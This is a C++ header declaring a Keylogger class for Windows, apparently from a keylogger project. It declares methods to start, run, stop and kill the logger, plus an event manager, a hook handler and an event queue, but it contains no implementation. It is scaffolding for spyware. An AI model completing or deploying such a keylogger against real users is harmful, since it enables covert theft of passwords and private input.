/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include <Windows.h>
#include <iostream>

#include "AEvent.h"
#include "EventManager.h"
#include "HookHandler.h"

class Keylogger {
public:
    Keylogger();
	~Keylogger();
    bool				init();   
    bool				run();
    bool				stop();
    bool				kill();
	bool				pushToQueue(const AEvent*);

private: 
	bool				_running;
    EventManager		_eventManager;
    HookHandler			_hookHandler;
    std::vector<AEvent*> _events;
};

#endif //_KEYLOGGER_H
